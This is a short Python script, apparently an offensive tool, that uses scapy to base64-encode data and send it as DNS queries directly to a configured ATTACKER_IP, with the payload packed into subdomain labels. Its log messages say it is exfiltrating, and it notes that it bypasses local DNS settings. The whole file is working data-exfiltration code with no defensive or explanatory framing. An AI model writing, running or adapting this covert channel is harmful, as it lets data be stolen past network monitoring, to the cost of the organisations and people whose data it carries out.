import base64
from scapy.all import IP, UDP, DNS, DNSQR, send, conf

# --- CONFIGURATION ---
ATTACKER_IP = "10.0.0.5"
ATTACKER_DOMAIN = "test.google.com"

# Disable scapy verbosity (stops it from printing "Sent 1 packet" every time)
conf.verb = 0

def send_data_over_dns(data):
    try:
        # 1. Encode data to URL-safe Base64
        encoded_data = base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

        # 2. Construct DNS query name (e.g., encoded_string.test.google.com.)
        target_domain = f"{encoded_data}.{ATTACKER_DOMAIN}."

        print(f"[>] Exfiltrating via DNS: {target_domain}")

        # 3. Craft DNS packet manually
        # This sends a packet DIRECTLY to 10.0.0.5, bypassing local DNS settings
        dns_query = IP(dst=ATTACKER_IP) / \
                    UDP(dport=53) / \
                    DNS(rd=1, qd=DNSQR(qname=target_domain, qtype="A"))

        # 4. Send packet
        send(dns_query, verbose=False)

        print(f"[✓] Packet sent to {ATTACKER_IP}")

    except Exception as e:
        print(f"[!] Error sending DNS: {e}")
